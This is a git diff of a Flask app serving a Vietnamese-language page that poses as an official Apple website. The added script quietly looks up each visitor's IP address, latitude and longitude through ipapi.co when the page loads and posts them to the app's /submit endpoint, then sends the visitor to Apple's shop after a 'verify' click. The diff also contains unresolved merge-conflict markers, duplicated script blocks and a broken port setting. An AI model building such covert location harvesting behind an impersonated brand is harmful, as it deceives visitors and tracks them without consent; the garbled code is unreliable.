@@ -142,23 +142,55 @@ HTML_PAGE = '''
     <a href="https://www.apple.com/legal/internet-services/itunes/vn/terms.html" target="_blank" style="font-size:13px; color:#0071e3; text-decoration:none; display:block; margin-top:10px;">
       Điều khoản & Dịch vụ của Apple
     </a>
+ HEAD
   </div>
  </div>
   <div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
   Website chính thức của apple
   </a>
+
+ 6cc5c18 (Push IP to backend + redirect to Apple Shop)
   </div>
+</div>
 
- <script>
-  const verifyBtn = document.getElementById("verifyBtn");
+<div style="text-align:center; font-size:13px; color:#6e6e73; margin-top:20px;">
+  Website chính thức của apple
+</div>
 
-  function verify() {
-    window.location.href = "https://www.apple.com/";
-  }
+<!-- Gửi IP về server khi trang vừa tải -->
+<script>
+  window.addEventListener('DOMContentLoaded', async () => {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
 
-  verifyBtn.addEventListener("click", verify);
+      const payload = {
+        ip: data.ip,
+        latitude: data.latitude,
+        longitude: data.longitude
+      };
 
+      await fetch('/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
 
+      console.log("✅ IP & vị trí đã gửi:", payload);
+    } catch (err) {
+      console.error("❌ Lỗi khi gửi IP:", err);
+    }
+  });
+
+  // Khi bấm nút Submit thì chuyển đến trang Apple Shop
+  document.getElementById("verifyBtn").addEventListener("click", () => {
+    window.location.href = "https://www.apple.com/shop/";
+  });
+</script>
+
+<<<<<<< HEAD
   <script>
   // Gửi IP + vị trí ngay khi trang vừa tải
   window.addEventListener('DOMContentLoaded', async () => {
@@ -192,6 +224,8 @@ HTML_PAGE = '''
   });
 </script>
 
+=======
+>>>>>>> 6cc5c18 (Push IP to backend + redirect to Apple Shop)
 
 </body>
 </html>
@@ -220,6 +254,10 @@ def submit():
 if __name__ == '__main__':
     import os
 
+HEAD
 port = int(os.environ.get("PORT", 10000))
+
+port = int(os.environ.get("PORT", 10001))
+6cc5c18 (Push IP to backend + redirect to Apple Shop)
 app.run(host='0.0.0.0', port=port, debug=True)
 
